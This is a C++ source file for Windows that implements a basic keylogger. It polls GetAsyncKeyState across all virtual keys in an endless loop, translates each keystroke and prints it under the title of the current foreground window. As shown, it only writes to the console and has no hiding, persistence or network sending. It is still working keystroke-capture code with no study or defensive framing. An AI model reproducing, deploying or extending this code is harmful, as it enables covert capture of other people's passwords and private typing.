#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include "key_controler.h"

#define WIN_TITLE_BUFSIZE 1024
#define STROKE_BUFSIZE 25
#define SLEEP_T 2		//msec

#define WIN_LAYOUT "\
==========================================\n\
Window : %s\n\
==========================================\n"


void swap_ptr(char*& p1, char*& p2) {
	char* tmp = p1;
	p1 = p2;
	p2 = tmp;
}


void getActiveWindowTitle(char* title) {
	const char nowin[] = "NO ACTIVE WINDOW";
	HWND hActiveWnd= GetForegroundWindow();
	GetWindowTextA(hActiveWnd, title, WIN_TITLE_BUFSIZE);
	if (strlen(title) == 0)
		memcpy(title, nowin, sizeof(nowin));
	}


int main(int argc, char* argv[]) {
	char buff_A[WIN_TITLE_BUFSIZE]="", buff_B[WIN_TITLE_BUFSIZE]="";
	char *old_win_title, *curr_win_title;

	old_win_title = buff_A;
	curr_win_title = buff_B;

	while (true) {
		char stroke[STROKE_BUFSIZE];

		Sleep(2);
		getActiveWindowTitle(curr_win_title);
		
		if ( strncmp(curr_win_title, old_win_title, WIN_TITLE_BUFSIZE) != 0) {
			printf(WIN_LAYOUT, curr_win_title);
			swap_ptr(old_win_title, curr_win_title);
		}

		for (unsigned vk = 1; vk < 255  ; ++vk) {
			if (GetAsyncKeyState(vk) & 0x1) {
				key_translate(stroke, vk);
				printf("%s", stroke);
			}
		}
	}
	return 0;
}